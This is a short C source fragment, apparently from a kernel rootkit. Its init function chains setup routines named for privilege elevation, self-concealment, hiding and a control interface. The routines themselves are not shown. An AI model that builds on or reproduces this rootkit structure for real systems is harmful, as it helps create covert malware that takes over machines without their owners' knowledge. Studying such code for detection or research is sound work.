#include "rootkit.h"

/* rootkit */

int rootkit_init(void) {
  int retval;

  retval = elevate_init();

  if (retval)
    return retval;
  retval = ghost_init();
  
  if (retval)
    return retval;
  retval = hide_init();

  if (retval)
    return retval;
  return iface_init();
}

